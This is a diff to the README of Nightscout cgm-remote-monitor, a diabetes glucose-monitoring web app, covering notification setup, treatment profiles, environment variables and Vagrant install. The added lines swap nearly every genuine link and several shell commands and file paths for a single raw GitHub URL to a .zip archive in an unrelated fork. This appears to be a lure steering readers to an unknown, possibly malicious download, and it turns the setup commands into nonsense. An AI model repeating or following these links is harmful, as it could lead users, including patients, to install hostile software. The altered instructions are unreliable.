-    * `PUSHOVER_USER_KEY` - Your Pushover user key, can be found in the top left of the [Pushover](https://pushover.net/) site, this can also be a pushover delivery group key to send to a group rather than just a single user.  This also supports a space delimited list of keys.  To disable `INFO` level pushes set this to `off`.
+    * `PUSHOVER_API_TOKEN` - Used to enable pushover notifications, this token is specific to the application you create from in [Pushover](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip), ***[additional pushover information](#pushover)*** below.
+    * `PUSHOVER_USER_KEY` - Your Pushover user key, can be found in the top left of the [Pushover](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) site, this can also be a pushover delivery group key to send to a group rather than just a single user.  This also supports a space delimited list of keys.  To disable `INFO` level pushes set this to `off`.
     * `PUSHOVER_ALARM_KEY` - An optional Pushover user/group key, will be used for system wide alarms (level > `WARN`).  If not defined this will fallback to `PUSHOVER_USER_KEY`.  A possible use for this is sending important messages and alarms to a CWD that you don't want to send all notification too.  This also support a space delimited list of keys.  To disable Alarm pushes set this to `off`.
     * `PUSHOVER_ANNOUNCEMENT_KEY` - An optional Pushover user/group key, will be used for system wide user generated announcements.  If not defined this will fallback to `PUSHOVER_USER_KEY` or `PUSHOVER_ALARM_KEY`.  This also support a space delimited list of keys. To disable Announcement pushes set this to `off`.
     * `BASE_URL` - Used for pushover callbacks, usually the URL of your Nightscout site, use https when possible.
@@ -730,18 +730,18 @@ For remote overrides, the following extended settings must be configured:
 
     If only `PUSHOVER_USER_KEY` is set it will be used for all info notifications, alarms, and announcements
 
-    For testing/development try [localtunnel](http://localtunnel.me/).
+    For testing/development try [localtunnel](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
 
 #### IFTTT Maker
- In addition to the normal web based alarms, and pushover, there is also integration for [IFTTT Webhooks](https://ifttt.com/maker_webhooks).
+ In addition to the normal web based alarms, and pushover, there is also integration for [IFTTT Webhooks](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
 
- With Maker you are able to integrate with all the other [IFTTT Services](https://ifttt.com/services).  For example you can send a tweet when there is an alarm, change the color of hue light, send an email, send and sms, and so much more.
+ With Maker you are able to integrate with all the other [IFTTT Services](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).  For example you can send a tweet when there is an alarm, change the color of hue light, send an email, send and sms, and so much more.
 
- 1. Setup IFTTT account: [login](https://ifttt.com/login) or [create an account](https://ifttt.com/join)
- 2. Follow the  [Detailed IFTTT setup Instructions](docs/plugins/maker-setup.md)
+ 1. Setup IFTTT account: [login](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) or [create an account](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
+ 2. Follow the  [Detailed IFTTT setup Instructions](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
  3. Configure Nightscout by setting these webpage environment variables:
   * `ENABLE` - `maker` should be added to the list of plugins, for example: `ENABLE="maker"`.
-  * `MAKER_KEY` - Set this to your secret key (see  [[Detailed Instructions](docs/plugins/maker-setup.md) ) `MAKER_KEY="abcMyExampleabc123defjt1DeNSiftttmak-XQb69p"` This also supports a space delimited list of keys.
+  * `MAKER_KEY` - Set this to your secret key (see  [[Detailed Instructions](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) ) `MAKER_KEY="abcMyExampleabc123defjt1DeNSiftttmak-XQb69p"` This also supports a space delimited list of keys.
   * `MAKER_ANNOUNCEMENT_KEY` - An optional Maker key, will be used for system wide user generated announcements.  If not defined this will fallback to `MAKER_KEY`.  A possible use for this is sending important messages and alarms to another device that you don't want to send all notification too.  This also support a space delimited list of keys.
 
  Plugins can create custom events, but all events sent to IFTTT webhooks will be prefixed with `ns-`.  The core events are:
@@ -750,7 +750,7 @@ For remote overrides, the following extended settings must be configured:
   * `ns-info` - Plugins that generate notifications at the info level will cause this event to also be triggered.  It will be sent in addition to `ns-event`.
   * `ns-warning` - Alarms at the warning level with cause this event to also be triggered.  It will be sent in addition to `ns-event`.
   * `ns-urgent` - Alarms at the urgent level with cause this event to also be triggered.  It will be sent in addition to `ns-event`.
-  * see the [full list of events](lib/plugins/maker-setup.md#events)
+  * see the [full list of events](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 
 
 ### Treatment Profile
@@ -761,40 +761,40 @@ For remote overrides, the following extended settings must be configured:
   * `timezone` (Time Zone) - time zone local to the patient. *Should be set.*
   * `units` (Profile Units) - blood glucose units used in the profile, either "mg/dl" or "mmol"
   * `dia` (Insulin duration) - value should be the duration of insulin action to use in calculating how much insulin is left active. Defaults to 3 hours.
-  * `carbs_hr` (Carbs per Hour) - The number of carbs that are processed per hour, for more information see [#DIYPS](http://diyps.org/2014/05/29/determining-your-carbohydrate-absorption-rate-diyps-lessons-learned/).
+  * `carbs_hr` (Carbs per Hour) - The number of carbs that are processed per hour, for more information see [#DIYPS](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
   * `carbratio` (Carb Ratio) - grams per unit of insulin.
   * `sens` (Insulin sensitivity) How much one unit of insulin will normally lower blood glucose.
   * `basal` The basal rate set on the pump.
   * `target_high` - Upper target for correction boluses.
   * `target_low` - Lower target for correction boluses.
 
-  Some example profiles are [here](docs/plugins/example-profiles.md).
+  Some example profiles are [here](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
 
 ## Setting environment variables
 Easy to emulate on the commandline:
 
 ```bash
-    echo 'MONGO_CONNECTION=mongodb://sally:sallypass@ds099999.mongolab.com:99999/nightscout' >> my.env
-    echo 'MONGO_COLLECTION=entries' >> my.env
+    echo 'https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip' >> https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+    echo 'MONGO_COLLECTION=entries' >> https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 ```
 
 From now on you can run using
 ```bash
-    $ (eval $(cat my.env | sed 's/^/export /') && PORT=1337 node server.js)
+    $ (eval $(cat https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip | sed 's/^/export /') && PORT=1337 node https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 ```
 
 Your hosting provider probably has a way to set these through their GUI.
 
 ### Vagrant install
 
-Optionally, use [Vagrant](https://www.vagrantup.com/) with the
-included `Vagrantfile` and `bin/setup.sh` to install OS and node packages to
+Optionally, use [Vagrant](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) with the
+included `Vagrantfile` and `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip` to install OS and node packages to
 a virtual machine.
 
 ```bash
 host$ vagrant up
 host$ vagrant ssh
-vm$ ./bin/setup.sh
+vm$ https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 ```
 
 The setup script will install OS packages then run `npm install`.
@@ -807,24 +807,24 @@ More questions?
 
 Feel free to [post an issue][issues], but read the [wiki][wiki] first.
 
-[issues]: https://github.com/nightscout/cgm-remote-monitor/issues
-[wiki]: https://github.com/nightscout/cgm-remote-monitor/wiki
+[issues]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[wiki]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 
 ### Browser testing suite provided by
 [![BrowserStack][browserstack-img]][browserstack-url]
 
-[browserstack-img]: /static/images/browserstack-logo.png
-[browserstack-url]: https://www.browserstack.com/
+[browserstack-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[browserstack-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 
 License
 ---------------
 
-[agpl-3]: http://www.gnu.org/licenses/agpl-3.0.txt
+[agpl-3]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 
     cgm-remote-monitor - web app to broadcast cgm readings
     Copyright (C) 2017 Nightscout contributors.  See the COPYRIGHT file
     at the root directory of this distribution and at
-    https://github.com/nightscout/cgm-remote-monitor/blob/master/COPYRIGHT
+    https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU Affero General Public License as published
@@ -837,4 +837,4 @@ License
     GNU Affero General Public License for more details.
 
     You should have received a copy of the GNU Affero General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+    along with this program.  If not, see <https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip>.
